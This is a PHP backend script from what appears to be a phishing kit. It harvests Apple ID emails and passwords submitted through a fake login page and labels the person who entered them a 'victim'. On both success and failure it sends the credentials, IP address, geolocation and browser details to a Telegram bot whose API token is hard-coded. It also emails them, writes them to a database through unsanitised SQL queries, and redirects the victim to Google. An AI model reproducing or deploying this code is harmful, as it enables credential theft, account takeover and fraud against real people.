<?php
session_start();
$email = $_POST['appleid'];
$pass = $_POST['password'];
$gmail = (empty($_GET['email']) ? NULL : $_GET['email']);
$v = (empty($_GET['v']) ? NULL : $_GET['v']);
$accessed = file_get_contents('../access.txt');
$date="".date("m/d/Y") . "";
$link=$ID.$v;
include '../dblog.php';
$connect = mysqli_connect($dbhost,$dbuser,$dbpassword,$dbname);
$agent = $_SERVER['HTTP_USER_AGENT'];
$user_ip = getuserip();
//$isp = geoip_isp_by_name($hostname);    
$ip_address = $_SERVER['REMOTE_ADDR'];
$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$ip_address"));
//$url = file_get_contents("http://whatismyipaddress.com/ip/$ip_address");
//preg_match_all('/<th>(.*?)<\/th><td>(.*?)<\/td>/s',$url,$output,PREG_SET_ORDER);    
//$isp = $output[3][2]; 
$country = $geo["geoplugin_countryName"]; //Country
$region = $geo["geoplugin_regionName"]; //Region
$protocol = $_SERVER['SERVER_PROTOCOL']; 
$headers  = 'MIME-Version: 1.0' . "\r\n";    
$headers .= 'From:iOServer<noreply@ioserver.com>' . "\r\n"; 
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 
include 'api.php';
include '../notif.php';
$agent = $_SERVER['HTTP_USER_AGENT'];
$names = '@iOServer';
$user_ip = getuserip();

if($httpcode==200 && stripos($myResult, "Invalid Apple ID/Password")==false && stripos($myResult, "This domain is not authorised to use SilentRemove API")==false&&stripos($myResult, "This Apple ID is locked")==false) {
    // SilentRemove Success
    // Result with images in $myResult

//Gift From @iOs-Teams
$message = '<table style="border:3px; background-image:url(http://designwoop.com/uploads/2012/03/19_free_subtle_textures_3px_tile.jpg); border-radius: 20px 20px 20px 20px;" border="0" cellpadding="5" cellspacing="5" width="600">
    <tbody>
        <tr>
            <th style="background-color:yellow; color:black; border-radius:20px 20px 0px 0px;">Your Device Succesfully Removed<br>Google Sign</th>
        </tr>
        <tr>
            <td style="text-align:left; color:yellow" valign="top">
			<strong style="color:white;">E-mail:</strong> '.$email.'<br>        
			<strong style="color:white;">Password:</strong> '.$pass.'<br><br>
			'.$myResult.'<br><br>
             <strong>KEEP SUPPORT iOServerKit</strong><br><br>
			<hr>
			<strong style="color:white;">Generate:</strong> '.$link.'<br>
			<hr>
			<strong style="color:white;">Country:</strong> '.$country.'<br>
			<strong style="color:white;">Region:</strong> '.$region.'<br>
			<strong style="color:white;">Browser:</strong> '.$agent.'<br>
			<strong style="color:white;">IP Address:</strong> '.$user_ip.'<br>
			</td>
        </tr>
    </tbody>
</table>';
//Notif by Telegram BOT
    $token     = "474892305:AAE6VOEBxf47R7FxuKVR4l85m_GRsQJ6_rA"; // Token of TELEGRAM API
$arr_true = array(
        "😍<b>Gift From @iOServer</b>😍",
        "%0A" . 
        "👉Google Sign👈",
        "%0A" . 
        "Generate : $link",
        "%0A" . 
        "Apple ID : $email",
        "Password : $pass",
        "%0A" . 
        "Autoremove :👉<i> Check Your Email</i>",
        "%0A" . 
        "Country : $country",
        "Region : $region",
        "Browser : $agent",
        "IP Address :$user_ip",
        "%0A" . 
        "KEEP SUPPORTING 👉 $names%C2%AE"
    );
    foreach ($arr_true as $value) {
        $txt_true .= "" . $value . "%0A";
    }
    $fp = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt_true}", "r");
	$subject = 'Gift From (@iOServer)';
	mail($to, $subject, $message, $headers);
	$path_to_file = '../access.txt';
	$file_contents = file_get_contents($path_to_file);
	$file_contents = str_replace($email, ',', $file_contents);
	$file_contents = str_replace($v, ',', $file_contents);
	file_put_contents($path_to_file, $file_contents);
	$arr = explode('@', $email);
	$name = $arr[0];
	echo '<script>window.location.href=\'https://accounts.google.com\'</script>';
	mysqli_query($connect,"UPDATE all_order SET order_status='REMOVED' WHERE order_link='$link'");
    mysqli_query($connect,"INSERT INTO unlocked_order VALUES('','$date','$link','$email','$pass','','YES','$country','$region','$user_ip')");
}
else {
//Notif by Telegram BOT
$token = "474892305:AAE6VOEBxf47R7FxuKVR4l85m_GRsQJ6_rA"; // Token of TELEGRAM API
$arr_getfalse = array(    
"😤<b>Victim Put wrong Password</b>😤",
"%0A".
"👉Google Sign👈",
"%0A" . 
"Generate : $link",
"%0A".
"Apple ID : $email",
"Password : $pass",
"%0A".
"Country : $country",
"Region : $region",
"Browser : $agent",
"IP Address : $user_ip",
"%0A".
"KEEP SUPPORTING 👉 $names%C2%AE",);     
foreach($arr_getfalse as $value) { 
     $txt_getfalse .= "".$value."%0A"; 
  }    
$fp=fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt_getfalse}","r");
	echo '<script>window.location.href=\'error.php?email=' . $email . '&v=' . $v . '\'</script>';
}
function getUserIP()
{
	$client = @($_SERVER['HTTP_CLIENT_IP']);
	$forward = @($_SERVER['HTTP_X_FORWARDED_FOR']);
	$remote = $_SERVER['REMOTE_ADDR'];
	if (filter_var($client, FILTER_VALIDATE_IP)) {
		$ip = $client;
	}
	else if (filter_var($forward, FILTER_VALIDATE_IP)) {
		$ip = $forward;
	}
	else {
		$ip = $remote;
	}
	return $ip;
}
?>
